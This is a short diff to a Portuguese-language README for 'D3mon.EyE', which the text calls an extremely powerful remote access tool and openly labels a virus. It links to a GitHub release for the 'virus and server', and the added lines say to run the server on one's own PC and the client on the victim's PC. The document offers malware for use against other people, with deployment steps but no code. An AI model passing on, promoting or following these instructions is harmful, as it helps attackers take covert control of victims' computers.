@@ -1,6 +1,8 @@
 # Olá a todos, eu apresento o D3mon.EyE!
 
 [Clique aqui para baixar o virus e o servidor](https://github.com/lowHemog/D3mon.EyE/releases/tag/v1.0)
+**Baixe Server side e execute no seu pc.**
+**Baixe Client side e execute no pc da vitima.**
 
 O D3mon eye é uma ferramenta de acesso remoto EXTREMAMENTE potente.
 
